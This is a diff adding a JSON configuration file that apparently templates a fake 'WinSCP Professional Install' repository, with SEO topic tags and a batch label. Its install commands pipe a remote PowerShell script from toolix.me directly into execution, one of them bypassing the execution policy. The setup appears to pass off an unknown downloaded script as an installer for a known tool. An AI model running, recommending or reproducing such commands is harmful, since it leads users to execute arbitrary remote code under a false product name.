@@ -1,0 +1,27 @@
+{
+  "repo": "WinSCP-Professional-Install",
+  "product": "WinSCP Professional Install",
+  "product_title": "WinSCP Professional Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "how-to-install-winscp-install",
+    "winscp-install-app",
+    "developer-tools",
+    "coding-workflow",
+    "terminal-client",
+    "database-tools",
+    "winscp-install-windows-tool",
+    "winscp-install-modeling-tool",
+    "winscp-install",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
